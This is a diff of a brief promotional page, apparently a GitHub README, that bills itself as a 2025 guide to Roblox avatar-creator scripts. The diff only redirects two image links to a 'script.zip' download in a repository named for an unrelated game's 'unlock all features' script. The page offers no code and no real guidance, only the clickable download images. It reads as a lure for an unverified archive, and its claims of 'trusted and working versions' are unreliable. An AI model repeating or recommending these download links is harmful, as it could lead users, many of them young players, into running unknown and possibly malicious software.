@@ -5,10 +5,10 @@ Are you looking to create the most **epic Roblox avatar** without spending hours
 In this 2025 master guide, we’ll cover everything about **Catalog Avatar Creator scripts** – how they work, what they offer, how to use them safely, and where to find the most trusted and working versions. Whether you’re a Roblox fashionista, developer, or just love customization, this guide is for you.
 
 [![image](https://github.com/user-attachments/assets/c2c76d38-17eb-42c0-8042-5bf1c445cd14)
-](https://github.com/Packet-star/studious-fishstick/releases/download/new/script.zip)
+](https://github.com/Rblx-GUI/Dandys-World-Script-Unlock-All-Features-and-Enhance-Your-Roblox-Experience-in-2025/releases/download/new/script.zip)
 
 [![maxresdefault](https://github.com/user-attachments/assets/8fff1093-8535-4839-adad-2e313ebc8eb2)
-](https://github.com/Packet-star/studious-fishstick/releases/download/new/script.zip)
+](https://github.com/Rblx-GUI/Dandys-World-Script-Unlock-All-Features-and-Enhance-Your-Roblox-Experience-in-2025/releases/download/new/script.zip)
 
 ---
 
